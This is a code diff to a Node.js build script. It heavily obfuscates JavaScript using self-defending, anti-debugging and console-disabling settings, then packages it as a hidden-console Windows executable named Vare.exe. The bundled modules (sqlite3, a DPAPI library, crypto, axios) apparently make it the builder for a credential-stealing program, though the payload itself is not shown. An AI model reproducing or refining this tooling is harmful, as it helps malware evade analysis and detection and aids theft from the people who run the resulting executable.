@@ -4,30 +4,15 @@ const { execSync } = require('child_process');
 
 
 async function obfuscate(code) {
-  console.log('[+] Obfuscation Step 1 Started')
+  console.log('[+] Obfuscation Started')
     var obfuscationResult = await JavaScriptObfuscator.obfuscate(code,{
-        "compact": true,
-        "controlFlowFlattening": true,
-        "controlFlowFlatteningThreshold": 1,
-        "deadCodeInjection": true,
-        "deadCodeInjectionThreshold": 1,
-        "debugProtection": true,
-        "debugProtectionInterval": 3000,
-        "disableConsoleOutput": true,
-        "rotateStringArray": true,
-        "selfDefending": true,
-        target: "node"
-      }
-    ).getObfuscatedCode()
-    console.log('[+] Obfuscation Step 2 Started')
-    var obfuscationResult2 = await JavaScriptObfuscator.obfuscate(obfuscationResult,{
         "compact": false,
         "controlFlowFlattening": true,
         "controlFlowFlatteningThreshold": 1,
         "deadCodeInjection": true,
         "deadCodeInjectionThreshold": 1,
         "debugProtection": true,
-        "debugProtectionInterval": 350,
+        "debugProtectionInterval": 5000,
         "disableConsoleOutput": true,
         "rotateStringArray": true,
         "selfDefending": true,
@@ -38,7 +23,7 @@ async function obfuscate(code) {
 require("path");
 require("crypto");
 require('sqlite3');
-require("lin-dpapi");
+require("vareapi");
 require('axios');
 require('os');
 require('fs-extra')
@@ -49,14 +34,14 @@ require('child_process');
 require('node-hide-console-window');  
 `
 
-      fs.writeFileSync('vareobf.js', modules + obfuscationResult2)
+      fs.writeFileSync('vareobf.js', modules + obfuscationResult)
       build()
 
 }
 
 async function build() {
   console.log('[+] Build Starting')
-  await execSync(`pkg . --targets node16-win-x64 -C Gzip --output Vare.exe`)
+  await execSync(`pkg . --targets node16-win-x64 -C Gzip --no-bytecode --output Vare.exe`)
   console.log('[+] Build Completed')
   fs.unlinkSync('./vareobf.js')
 }
